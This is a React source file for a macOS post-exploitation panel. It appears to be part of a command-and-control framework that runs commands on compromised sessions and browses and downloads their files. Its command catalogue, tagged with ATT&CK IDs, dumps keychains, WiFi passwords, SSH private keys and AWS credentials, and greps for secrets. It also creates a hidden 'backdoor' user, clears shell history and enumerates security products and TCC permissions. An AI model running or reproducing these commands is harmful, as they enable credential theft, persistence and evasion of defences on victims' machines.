import { useState, useMemo } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import {
  Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
  Download, Copy, CheckCheck, ChevronRight, ChevronDown,
  Search, Hash, X,
} from 'lucide-react'

// ─── Types ────────────────────────────────────────────────────────────────────
interface ExecResult  { stdout: string; stderr: string; exit_code: number }
interface FileInfo    { name: string; is_dir: boolean; size: number; mod_time: number }
interface LsResp      { path: string; files: FileInfo[] }
interface Task        { id: number; cmd: string; result: string; ok: boolean; ts: number; open: boolean }

// ─── Helpers ─────────────────────────────────────────────────────────────────
function fmtBytes(b: number) {
  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)} MB`
  if (b >= 1024)    return `${(b / 1024).toFixed(1)} KB`
  return `${b} B`
}
function joinUnix(base: string, name: string) { return base.replace(/\/+$/, '') + '/' + name }
function parentUnix(p: string) {
  if (p === '/') return '/'
  const t = p.replace(/\/+$/, '')
  const i = t.lastIndexOf('/')
  return i <= 0 ? '/' : t.slice(0, i)
}

// ─── Command catalogue ────────────────────────────────────────────────────────
interface Cmd { icon: string; label: string; cmd: string; tag?: string }
interface Cat { id: string; icon: string; label: string; atkId: string; cmds: Cmd[] }

const CATS: Cat[] = [
  {
    id: 'recon', icon: '🔍', label: 'RECON', atkId: 'TA0007',
    cmds: [
      { icon: '👤', label: 'id / groups',               cmd: 'id && groups',                                                                tag: 'T1033' },
      { icon: '💻', label: 'macOS Version',              cmd: 'sw_vers && uname -a',                                                         tag: 'T1082' },
      { icon: '🖥️', label: 'Hardware (system_profiler)', cmd: 'system_profiler SPHardwareDataType 2>/dev/null | head -20',                   tag: 'T1082' },
      { icon: '⏱️', label: 'Uptime / Logins',           cmd: 'uptime && who && last | head -15',                                            tag: 'T1033' },
      { icon: '👥', label: 'Local Users (dscl)',         cmd: 'dscl . -list /Users | grep -v "^_"',                                         tag: 'T1087' },
      { icon: '🔑', label: 'Admin Members',              cmd: 'dscl . -read /Groups/admin GroupMembership 2>/dev/null',                     tag: 'T1069' },
      { icon: '📋', label: 'Process Tree',               cmd: 'ps auxf | head -40',                                                          tag: 'T1057' },
      { icon: '⚙️', label: 'LaunchAgents (launchctl)',   cmd: 'launchctl list 2>/dev/null | head -30',                                       tag: 'T1007' },
      { icon: '📦', label: 'Installed Apps',             cmd: 'ls /Applications/ | head -30; ls ~/Applications/ 2>/dev/null',               tag: 'T1518' },
      { icon: '🔒', label: 'SIP Status',                 cmd: 'csrutil status 2>/dev/null',                                                  tag: 'T1553' },
      { icon: '🛡️', label: 'Gatekeeper Status',         cmd: 'spctl --status 2>/dev/null',                                                  tag: 'T1553' },
      { icon: '📝', label: 'Environment Variables',      cmd: 'env | sort | head -40',                                                       tag: 'T1082' },
    ],
  },
  {
    id: 'privesc', icon: '⬆️', label: 'PRIV ESC', atkId: 'TA0004',
    cmds: [
      { icon: '🎭', label: 'sudo -l',                    cmd: 'sudo -l 2>&1',                                                                tag: 'T1548' },
      { icon: '🔑', label: 'SUID Binaries',              cmd: 'find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null',           tag: 'T1548' },
      { icon: '🔐', label: 'Keychain List',              cmd: 'security list-keychains; security dump-keychain 2>/dev/null | head -20',      tag: 'T1555' },
      { icon: '📂', label: 'Writable PATH Dirs',         cmd: 'for p in $(echo $PATH | tr : " "); do [ -w "$p" ] && echo "WRITABLE: $p"; done', tag: 'T1574' },
      { icon: '📝', label: 'LaunchAgents / Daemons',     cmd: 'ls -la /Library/LaunchAgents/ /Library/LaunchDaemons/ ~/Library/LaunchAgents/ 2>/dev/null', tag: 'T1543' },
      { icon: '🐳', label: 'Docker Socket Check',        cmd: 'ls /var/run/docker.sock 2>/dev/null && echo DOCKER_SOCK_FOUND; docker ps 2>/dev/null | head -5', tag: 'T1611' },
      { icon: '⚡', label: 'Writable LaunchDaemons',     cmd: 'for f in /Library/LaunchDaemons/*.plist; do [ -w "$f" ] && echo "WRITABLE: $f"; done 2>/dev/null', tag: 'T1574' },
      { icon: '🍎', label: 'Architecture (Rosetta)',      cmd: 'uname -m; arch; file /bin/ls',                                               tag: 'T1082' },
      { icon: '🔧', label: 'nvram boot-args',            cmd: 'nvram boot-args 2>/dev/null; csrutil status',                                tag: 'T1553' },
    ],
  },
  {
    id: 'creds', icon: '🔑', label: 'CREDENTIALS', atkId: 'TA0006',
    cmds: [
      { icon: '🔑', label: 'Keychain Dump',              cmd: 'security dump-keychain -d login.keychain 2>/dev/null | head -50 || echo needs-user-consent', tag: 'T1555' },
      { icon: '🔒', label: 'Internet Passwords',         cmd: 'security find-internet-password -ga "" 2>&1 | head -20',                    tag: 'T1555' },
      { icon: '📜', label: 'SSH Keys',                   cmd: 'ls -la ~/.ssh/; cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 2>/dev/null | head -10', tag: 'T1552' },
      { icon: '📋', label: 'Shell Histories',            cmd: 'cat ~/.zsh_history ~/.bash_history 2>/dev/null | tail -50',                 tag: 'T1552' },
      { icon: '🦊', label: 'Firefox Login Files',        cmd: 'ls ~/Library/Application\\ Support/Firefox/Profiles/*/logins.json 2>/dev/null', tag: 'T1555' },
      { icon: '🌐', label: 'Chrome Login Data',          cmd: 'ls ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data 2>/dev/null', tag: 'T1555' },
      { icon: '📧', label: 'Mail Account Plists',        cmd: 'find ~/Library/Mail -name "Accounts.plist" 2>/dev/null | xargs grep -A3 "Username\\|Hostname" 2>/dev/null | head -20', tag: 'T1555' },
      { icon: '🌐', label: 'WiFi Passwords',             cmd: 'for ssid in $(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2); do echo -n "$ssid: "; security find-generic-password -ga "$ssid" 2>&1 | grep "password:"; done', tag: 'T1552' },
      { icon: '🔑', label: 'AWS / Cloud Creds',          cmd: 'cat ~/.aws/credentials ~/.aws/config 2>/dev/null',                          tag: 'T1552' },
      { icon: '📦', label: '.env / Docker Secrets',      cmd: 'find ~ -name "*.env" -o -name "docker-compose.yml" 2>/dev/null | xargs grep -l "password\\|secret\\|token" 2>/dev/null | head -10', tag: 'T1552' },
    ],
  },
  {
    id: 'network', icon: '🌐', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Addresses',               cmd: 'ifconfig | grep -E "inet |inet6 "',                                         tag: 'T1016' },
      { icon: '🗺️', label: 'ARP Table',                 cmd: 'arp -an',                                                                    tag: 'T1016' },
      { icon: '🔌', label: 'Listening Ports (lsof)',     cmd: 'lsof -i -P -n | grep LISTEN',                                               tag: 'T1049' },
      { icon: '🛤️', label: 'Routing Table',             cmd: 'netstat -rn',                                                               tag: 'T1016' },
      { icon: '🌍', label: 'DNS Config (scutil)',         cmd: 'cat /etc/resolv.conf; scutil --dns | head -20',                            tag: 'T1016' },
      { icon: '🔥', label: 'Firewall Status',            cmd: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null', tag: 'T1562' },
      { icon: '📡', label: 'Active Connections',         cmd: 'lsof -i -P -n | grep ESTABLISHED | head -30',                              tag: 'T1049' },
      { icon: '🏠', label: 'Hosts File',                 cmd: 'cat /etc/hosts',                                                            tag: 'T1016' },
      { icon: '🌐', label: 'VPN / utun Interfaces',      cmd: 'scutil --nc list 2>/dev/null; ifconfig | grep -A5 utun',                   tag: 'T1090' },
      { icon: '📶', label: 'WiFi Info (airport)',        cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null', tag: 'T1016' },
    ],
  },
  {
    id: 'files', icon: '📁', label: 'FILE SYSTEM', atkId: 'TA0009',
    cmds: [
      { icon: '🏠', label: 'Home Directory',             cmd: 'ls -la ~/ | head -30',                                                       tag: 'T1083' },
      { icon: '📝', label: 'Recent Files (mdfind)',      cmd: 'mdfind -onlyin ~ "kMDItemLastUsedDate > $time.today(-7)" 2>/dev/null | head -30 || find ~ -mtime -7 -type f 2>/dev/null | head -30', tag: 'T1083' },
      { icon: '📄', label: 'Find Password Files',        cmd: 'grep -rl "password\\|passwd\\|secret" ~/Documents ~/Desktop ~/Downloads 2>/dev/null | head -15', tag: 'T1083' },
      { icon: '📦', label: 'App Support Dir',            cmd: 'ls ~/Library/Application\\ Support/ | head -30',                            tag: 'T1083' },
      { icon: '🔑', label: 'Private Keys',               cmd: 'find ~ / -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | grep -v proc | head -15', tag: 'T1552' },
      { icon: '💾', label: 'SQLite / DB Files',          cmd: 'find ~ /var -name "*.db" -o -name "*.sqlite" 2>/dev/null | grep -v proc | head -15', tag: 'T1005' },
      { icon: '📋', label: 'Log Files',                  cmd: 'ls -lSh /var/log/ ~/Library/Logs/ 2>/dev/null | head -20',                 tag: 'T1005' },
      { icon: '🗑️', label: 'Trash Contents',            cmd: 'ls -la ~/.Trash/ 2>/dev/null | head -20',                                   tag: 'T1083' },
      { icon: '💻', label: 'Desktop + Downloads',        cmd: 'ls ~/Desktop/ ~/Downloads/ 2>/dev/null | head -30',                        tag: 'T1083' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '⚙️', label: 'LaunchAgents (user)',        cmd: 'ls -la ~/Library/LaunchAgents/ 2>/dev/null; cat ~/Library/LaunchAgents/*.plist 2>/dev/null | grep -E "Program|Label" | head -20', tag: 'T1543' },
      { icon: '🔧', label: 'LaunchDaemons (root)',       cmd: 'ls -la /Library/LaunchDaemons/ 2>/dev/null | head -20',                     tag: 'T1543' },
      { icon: '🔌', label: 'Login Items (osascript)',    cmd: 'osascript -e "tell application \\"System Events\\" to get the name of every login item" 2>/dev/null', tag: 'T1547' },
      { icon: '🏃', label: 'Shell Profile (~/.zshrc)',   cmd: 'cat ~/.zshrc ~/.bash_profile ~/.profile /etc/zshrc 2>/dev/null | head -40', tag: 'T1546' },
      { icon: '📦', label: 'Cron Jobs',                  cmd: 'crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null',                        tag: 'T1053' },
      { icon: '🔑', label: 'SSH Authorized Keys',        cmd: 'cat ~/.ssh/authorized_keys 2>/dev/null',                                   tag: 'T1098' },
      { icon: '👤', label: 'Add Backdoor User',          cmd: 'sudo dscl . -create /Users/backdoor Username backdoor 2>/dev/null && sudo dscl . -create /Users/backdoor UserShell /bin/zsh 2>/dev/null && echo done || echo needs-sudo', tag: 'T1136' },
      { icon: '🔄', label: 'Periodic Scripts',           cmd: 'ls /etc/periodic/daily/ /etc/periodic/weekly/ /etc/periodic/monthly/ 2>/dev/null', tag: 'T1037' },
      { icon: '🗑️', label: 'Clear Shell History',       cmd: 'cat /dev/null > ~/.zsh_history && cat /dev/null > ~/.bash_history && echo cleared', tag: 'T1070' },
    ],
  },
  {
    id: 'bypass', icon: '🛡️', label: 'SEC BYPASS', atkId: 'TA0005',
    cmds: [
      { icon: '🛡️', label: 'SIP + Gatekeeper',          cmd: 'csrutil status; spctl --status',                                             tag: 'T1553' },
      { icon: '🔒', label: 'TCC DB (user)',               cmd: 'sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT service,client,allowed FROM access" 2>/dev/null | head -20 || echo needs-FDA', tag: 'T1562' },
      { icon: '📷', label: 'Camera / Mic TCC entries',   cmd: 'sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db "SELECT service,client,allowed FROM access WHERE service LIKE \'%Camera%\' OR service LIKE \'%Microphone%\'" 2>/dev/null', tag: 'T1562' },
      { icon: '🔍', label: 'AV / EDR Products',          cmd: 'ls /Applications | grep -i "CrowdStrike\\|SentinelOne\\|Jamf\\|Carbon\\|Cortex\\|Malwarebytes"; system_profiler SPInstallHistoryDataType 2>/dev/null | grep -i "crowdstrike\\|sentinelone\\|jamf" | head -5', tag: 'T1518' },
      { icon: '🔑', label: 'Keychain Unlock',            cmd: 'security unlock-keychain -p "" ~/Library/Keychains/login.keychain-db 2>/dev/null && echo unlocked || echo locked', tag: 'T1555' },
      { icon: '🌍', label: 'MDM Enrollment Status',      cmd: 'profiles status -type enrollment 2>/dev/null',                              tag: 'T1553' },
      { icon: '🔐', label: 'Entitlements (sudo)',         cmd: 'codesign -d --entitlements - /usr/bin/sudo 2>/dev/null | head -20',        tag: 'T1553' },
      { icon: '🧩', label: 'AMFI / nvram boot-args',     cmd: 'nvram boot-args 2>/dev/null; sysctl kern.amfiresult 2>/dev/null',          tag: 'T1553' },
      { icon: '📱', label: 'Apple Silicon / T2 Chip',    cmd: 'system_profiler SPHardwareDataType | grep -E "Chip:|Processor Name:|T2"',  tag: 'T1082' },
      { icon: '💉', label: 'DYLD injection check',       cmd: 'csrutil status; echo "dylib injection requires SIP disabled"',              tag: 'T1055' },
    ],
  },
]

let _tid = 0

// ─── Component ────────────────────────────────────────────────────────────────
interface Props { onOpenTerminal: (id: string, name?: string) => void }

export default function MacOS({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
  const sessions = (data ?? []).filter(s => {
    const os = (s.os ?? '').toLowerCase()
    return ['darwin','macos','mac os','osx'].some(k => os.includes(k))
  })

  const [selId,     setSelId]     = useState<string | null>(null)
  const [tasks,     setTasks]     = useState<Task[]>([])
  const [running,   setRunning]   = useState(false)
  const [custom,    setCustom]    = useState('')
  const [search,    setSearch]    = useState('')
  const [openCats,  setOpenCats]  = useState<Set<string>>(new Set(['recon']))
  const [showFs,    setShowFs]    = useState(false)
  const [copied,    setCopied]    = useState<number | null>(null)
  const [fsPath,    setFsPath]    = useState('/')
  const [fsData,    setFsData]    = useState<LsResp | null>(null)
  const [fsLoading, setFsLoading] = useState(false)

  const sel = sessions.find(s => s.id === selId) ?? null

  async function exec(cmd: string, label: string) {
    if (!selId || running) return
    setRunning(true)
    const id = ++_tid
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${selId}/execute`, { command: cmd })
      const out = (r.stdout || r.stderr || '(no output)').slice(0, 8000)
      setTasks(p => [{ id, cmd: label, result: out, ok: r.exit_code === 0, ts: Date.now(), open: true }, ...p].slice(0, 100))
    } catch (e) {
      setTasks(p => [{ id, cmd: label, result: String(e), ok: false, ts: Date.now(), open: true }, ...p].slice(0, 100))
    } finally { setRunning(false) }
  }

  async function browseFs(path: string) {
    if (!selId) return
    setFsLoading(true)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${selId}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(ls.path); setFsData(ls)
    } catch { exec(`ls -la "${path}"`, `ls ${path}`) }
    finally { setFsLoading(false) }
  }

  function downloadFile(path: string) {
    if (!selId) return
    window.open(`/api/sessions/${selId}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  function copy(id: number, text: string) {
    navigator.clipboard.writeText(text).then(() => { setCopied(id); setTimeout(() => setCopied(null), 1500) })
  }

  function toggleTask(id: number) {
    setTasks(p => p.map(t => t.id === id ? { ...t, open: !t.open } : t))
  }

  function toggleCat(id: string) {
    setOpenCats(prev => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s })
  }

  const filteredCats = useMemo(() => {
    const q = search.trim().toLowerCase()
    if (!q) return CATS
    return CATS.map(c => ({ ...c, cmds: c.cmds.filter(cmd => cmd.label.toLowerCase().includes(q)) })).filter(c => c.cmds.length > 0)
  }, [search])

  const fsFiles = (fsData?.files ?? []).filter(f => f.name !== '.' && f.name !== '..')

  return (
    <div className="flex h-full overflow-hidden rounded-lg border border-border bg-bg font-mono">

      {/* ══ COL 1 — Session List ══════════════════════════════════════════════ */}
      <aside className="w-48 shrink-0 flex flex-col border-r border-border" style={{ background: '#090909' }}>
        <div className="flex items-center justify-between px-3 py-2.5 border-b border-border">
          <span className="text-[10px] font-bold tracking-widest text-muted uppercase">macOS</span>
          <button onClick={refresh} className="text-muted hover:text-primary transition-colors">
            <RefreshCw size={11} className={loading ? 'animate-spin' : ''} />
          </button>
        </div>
        <div className="flex-1 overflow-y-auto">
          {!loading && sessions.length === 0 && (
            <div className="p-4 text-center space-y-1">
              <Monitor size={20} className="text-border mx-auto" />
              <p className="text-muted text-[10px]">No macOS sessions</p>
            </div>
          )}
          {sessions.map(s => {
            const active = s.id === selId
            return (
              <button key={s.id}
                onClick={() => { setSelId(s.id); setTasks([]); setShowFs(false); setFsPath('/'); setFsData(null) }}
                className={`w-full text-left px-3 py-2.5 border-b border-border/20 transition-all group ${active ? 'bg-primary/8 border-l-2 border-l-primary' : 'hover:bg-white/4'}`}>
                <div className="flex items-center gap-1.5 mb-1">
                  <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${active ? 'bg-primary' : 'bg-muted'}`} />
                  <span className={`text-[11px] font-semibold truncate ${active ? 'text-text' : 'text-muted group-hover:text-text'}`}>{s.hostname}</span>
                </div>
                <div className="pl-3 space-y-0.5">
                  <div className="text-[9px] text-muted truncate">{s.username}</div>
                  <div className="text-[9px] text-muted truncate">{s.remote_address}</div>
                  <div className={`text-[9px] truncate ${active ? 'text-primary/70' : 'text-muted/60'}`}>{s.os} · {s.arch}</div>
                </div>
              </button>
            )
          })}
        </div>
        {error && <p className="px-2 py-1 text-[9px] text-danger">{error}</p>}
      </aside>

      {/* ══ COL 2 — Command Palette ══════════════════════════════════════════ */}
      {selId && (
        <div className="w-56 shrink-0 flex flex-col border-r border-border" style={{ background: '#0b0b0b' }}>
          <div className="px-3 py-2 border-b border-border">
            <div className="flex items-center justify-between">
              <span className="text-[9px] font-bold text-primary tracking-widest uppercase">Target</span>
              <button onClick={() => onOpenTerminal(selId, sel?.name || sel?.hostname)}
                className="flex items-center gap-1 text-muted hover:text-primary text-[9px] transition-colors">
                <Terminal size={9} /> Shell
              </button>
            </div>
            <div className="text-[10px] text-text font-semibold mt-0.5 truncate">{sel?.hostname}</div>
            <div className="text-[9px] text-muted truncate">{sel?.username} · {sel?.remote_address}</div>
          </div>

          <div className="px-2 py-1.5 border-b border-border">
            <div className="flex items-center gap-1.5 bg-bg/60 border border-border rounded px-2 py-1">
              <Search size={10} className="text-muted shrink-0" />
              <input value={search} onChange={e => setSearch(e.target.value)} placeholder="filter modules…"
                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/60 outline-none min-w-0" />
              {search && <button onClick={() => setSearch('')} className="text-muted hover:text-text shrink-0"><X size={9} /></button>}
            </div>
          </div>

          <div className="flex-1 overflow-y-auto">
            {filteredCats.map(cat => {
              const open = openCats.has(cat.id) || !!search.trim()
              return (
                <div key={cat.id}>
                  <button onClick={() => !search.trim() && toggleCat(cat.id)}
                    className="w-full flex items-center gap-1.5 px-3 py-1.5 hover:bg-white/4 transition-colors group">
                    <span className="text-xs">{cat.icon}</span>
                    <span className="flex-1 text-[9px] font-bold tracking-widest text-muted group-hover:text-text uppercase text-left">{cat.label}</span>
                    <span className="text-[8px] text-muted/60 font-mono">{cat.atkId}</span>
                    {open ? <ChevronDown size={9} className="text-muted shrink-0" /> : <ChevronRight size={9} className="text-muted shrink-0" />}
                  </button>
                  {open && cat.cmds.map(c => (
                    <button key={c.label} disabled={running} onClick={() => exec(c.cmd, c.label)}
                      className="w-full flex items-center gap-2 px-4 py-1.5 hover:bg-primary/8 transition-colors group disabled:opacity-40 text-left">
                      <span className="text-[11px] shrink-0">{c.icon}</span>
                      <span className="flex-1 text-[10px] text-muted group-hover:text-text transition-colors truncate">{c.label}</span>
                      {c.tag && <span className="text-[8px] text-muted/40 font-mono shrink-0">{c.tag}</span>}
                    </button>
                  ))}
                </div>
              )
            })}
          </div>

          <div className="shrink-0 border-t border-border">
            <div className="flex items-center gap-1.5 px-2.5 py-2 border-b border-border/50">
              <span className="text-muted text-[10px] font-bold select-none shrink-0">%</span>
              <input value={custom} onChange={e => setCustom(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                placeholder="custom command…"
                className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/50 outline-none font-mono min-w-0" />
              <button onClick={() => { if (custom.trim()) { exec(custom.trim(), custom.trim()); setCustom('') } }}
                disabled={running || !custom.trim()} className="text-muted hover:text-primary disabled:opacity-30 shrink-0">
                {running ? <Loader size={10} className="animate-spin" /> : <Send size={10} />}
              </button>
            </div>
            <button onClick={() => { setShowFs(true); if (!fsData) browseFs(fsPath) }}
              className={`w-full flex items-center gap-2 px-3 py-2 text-[10px] transition-colors ${showFs ? 'bg-primary/10 text-primary' : 'text-muted hover:text-text hover:bg-white/4'}`}>
              <FolderOpen size={11} /> File Browser
            </button>
          </div>
        </div>
      )}

      {/* ══ COL 3 — Task Output / File Browser ══════════════════════════════ */}
      {selId ? (
        <div className="flex-1 flex flex-col min-w-0 min-h-0">
          {showFs ? (
            <div className="flex-1 flex flex-col min-h-0">
              <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border bg-surface/40">
                <FolderOpen size={11} className="text-primary shrink-0" />
                <span className="text-[10px] text-muted font-mono flex-1 truncate">{fsPath}</span>
                <button onClick={() => browseFs(parentUnix(fsPath))} className="text-muted hover:text-text text-[10px] flex items-center gap-1 shrink-0">
                  <ChevronRight size={10} className="rotate-180" /> Up
                </button>
                <button onClick={() => browseFs(fsPath)} className="text-muted hover:text-primary shrink-0">
                  <RefreshCw size={10} className={fsLoading ? 'animate-spin' : ''} />
                </button>
                <button onClick={() => setShowFs(false)} className="text-muted hover:text-text shrink-0"><X size={10} /></button>
              </div>
              <div className="flex-1 overflow-y-auto text-[11px]">
                {fsLoading
                  ? <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>
                  : fsFiles.length === 0
                  ? <div className="p-4 text-muted text-center text-xs">Empty directory</div>
                  : fsFiles.map(f => (
                    <div key={f.name} className="flex items-center gap-2 px-3 py-1.5 border-b border-border/20 hover:bg-white/3 group">
                      <span className="shrink-0">{f.is_dir ? '📁' : '📄'}</span>
                      <button onClick={() => f.is_dir && browseFs(joinUnix(fsPath, f.name))}
                        className={`flex-1 text-left truncate text-[10px] ${f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text cursor-default'}`}>
                        {f.name}
                      </button>
                      {!f.is_dir && <span className="text-[9px] text-muted shrink-0 tabular-nums">{fmtBytes(f.size)}</span>}
                      {!f.is_dir && (
                        <button onClick={() => downloadFile(joinUnix(fsPath, f.name))}
                          className="text-muted hover:text-primary opacity-0 group-hover:opacity-100 transition-all shrink-0" title="Download">
                          <Download size={10} />
                        </button>
                      )}
                    </div>
                  ))}
              </div>
            </div>
          ) : (
            <div className="flex-1 flex flex-col min-h-0">
              <div className="shrink-0 flex items-center justify-between px-4 py-2 border-b border-border bg-surface/30">
                <div className="flex items-center gap-2">
                  <Hash size={11} className="text-muted" />
                  <span className="text-[10px] text-muted font-semibold uppercase tracking-wider">Task History</span>
                  {tasks.length > 0 && <span className="text-[9px] bg-border/60 text-muted px-1.5 py-0.5 rounded-full">{tasks.length}</span>}
                  {running && <Loader size={10} className="text-primary animate-spin" />}
                </div>
                {tasks.length > 0 && <button onClick={() => setTasks([])} className="text-[9px] text-muted hover:text-danger transition-colors">Clear</button>}
              </div>
              <div className="flex-1 overflow-y-auto p-3 space-y-2">
                {tasks.length === 0 ? (
                  <div className="flex flex-col items-center justify-center h-full gap-3 text-center py-16">
                    <div className="w-10 h-10 rounded-full border border-border flex items-center justify-center">
                      <Terminal size={18} className="text-border" />
                    </div>
                    <div className="text-muted text-xs">No tasks yet</div>
                    <div className="text-muted/60 text-[10px] max-w-xs">Select a module from the command palette or type a custom command</div>
                  </div>
                ) : tasks.map((t, i) => (
                  <div key={t.id} className={`border rounded overflow-hidden ${t.ok ? 'border-border/60' : 'border-danger/30'}`}>
                    <button onClick={() => toggleTask(t.id)}
                      className={`w-full flex items-center gap-2.5 px-3 py-2 text-left transition-colors ${t.ok ? 'bg-surface/60 hover:bg-surface' : 'bg-danger/5 hover:bg-danger/8'}`}>
                      <span className="text-[9px] text-muted/50 font-mono shrink-0 tabular-nums">#{String(tasks.length - i).padStart(2, '0')}</span>
                      <span className={`shrink-0 rounded px-1.5 py-0.5 text-[8px] font-bold tracking-wider ${t.ok ? 'bg-primary/15 text-primary' : 'bg-danger/20 text-danger'}`}>
                        {t.ok ? 'SUCCESS' : 'ERROR'}
                      </span>
                      <span className="flex-1 text-[10px] text-text font-semibold truncate">{t.cmd}</span>
                      <span className="text-[9px] text-muted shrink-0 tabular-nums">{new Date(t.ts).toLocaleTimeString()}</span>
                      <button onClick={e => { e.stopPropagation(); copy(t.id, t.result) }} className="text-muted hover:text-primary shrink-0 transition-colors">
                        {copied === t.id ? <CheckCheck size={10} /> : <Copy size={10} />}
                      </button>
                      {t.open ? <ChevronDown size={10} className="text-muted shrink-0" /> : <ChevronRight size={10} className="text-muted shrink-0" />}
                    </button>
                    {t.open && (
                      <pre className="px-4 py-3 text-[10px] text-text/90 whitespace-pre-wrap break-all leading-relaxed max-h-72 overflow-y-auto bg-bg/80 border-t border-border/30">
                        {t.result}
                      </pre>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      ) : (
        <div className="flex-1 flex flex-col items-center justify-center gap-4 p-8 text-center">
          <div className="w-14 h-14 rounded-full border border-border flex items-center justify-center">
            <Monitor size={24} className="text-border" />
          </div>
          <div>
            <div className="text-muted text-sm font-semibold mb-1">No session selected</div>
            <div className="text-muted/60 text-xs max-w-xs leading-relaxed">Select a macOS target from the session list to begin post-exploitation</div>
          </div>
        </div>
      )}
    </div>
  )
}
